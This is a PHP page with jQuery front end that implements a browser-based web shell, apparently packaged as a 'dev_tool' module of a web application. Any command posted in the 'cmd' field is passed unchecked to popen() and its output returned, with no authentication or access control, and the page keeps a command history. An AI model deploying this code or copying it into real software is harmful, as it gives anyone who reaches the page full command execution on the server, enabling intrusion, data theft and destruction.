<?php
	function exec_shell($_cmd) {
		$fp = popen($_cmd, "r");

		$readMsg = "";
		while( !feof($fp) ) {
			$buffer = fgets($fp, 4096);
			$readMsg .= $buffer . "<br />";
		}
		pclose($fp);

		return $readMsg;
	}

	if( isset($_POST["type"]) && $_POST["type"] == "exec" ) {
		$cmd = $_POST["cmd"];

		echo exec_shell($cmd);

		exit ;
	}
?>

<script type="text/javascript">
	class WebShellFunc {

		constructor() {
			this.path = "http://<?php echo $_SERVER["HTTP_HOST"]; ?>/modules/dev_tool/html/script/exec_web_shell.php";
		}

		makeArgs(_key, _value) {
			var args = "&" + _key + "=" + _value;

			return args;
		}

		postArgs(_target, _args) {
			var result;

			$.ajax({
				type	: "POST",
				url		: _target,
				data	: _args,
				async	: false,
				success	: function(data) {
					if( data != null ) {
						result = data;
					}
				}
			});

			return result;
		}

		exec(_cmd) {
			var submitArgs = "";

			submitArgs	+= this.makeArgs("type",   "exec");
			submitArgs	+= this.makeArgs("cmd",    _cmd);

			return this.postArgs(this.path, submitArgs);
		}
	}

	$(document).ready(function() {
		var webFunc = new WebShellFunc();
		var index = 1;
		$("#shell-input_exec").keyup(function(e) {
			if (e.keyCode == 13) $("#shell-div_enter").trigger("click");

			return;
		});

		$("#shell-div_enter").click(function() {
			var rc = webFunc.exec($("#shell-input_exec").val());

			$("#shell-div_frame").html(rc);
			$("#shell-div_header_frame").html("[" + $("#shell-input_exec").val() + "]");
			$("#shell-div_history_frame").prepend("<div>" + index + "&nbsp;&nbsp;" + $("#shell-input_exec").val() + "</div>");
			$("#shell-input_exec").val("");

			index++;

			return ;
		});
	});
</script>

<div id="shell-div_page_title_name"> 웹 쉘 (Web shell) </div>

<hr class="title-hr" />

<div id="shell-div_form" class="ui-widget-content">
	<div id="shell-div_header_frame">

	</div>
	<div id="shell-div_frame">

	</div>
</div>
<div id="shell-div_log_input" class="ui-widget-content">
	<input type="text" id="shell-input_exec" />
	<div class="div_module_button" id="shell-div_enter" style="height: 18px; line-height: 18px; margin-left: 10px; "> Enter </div>
</div>

<br />
<b>History</b>
<div id="shell-div_history_form" class="ui-widget-content">
	<div id="shell-div_history_frame">

	</div>
</div>
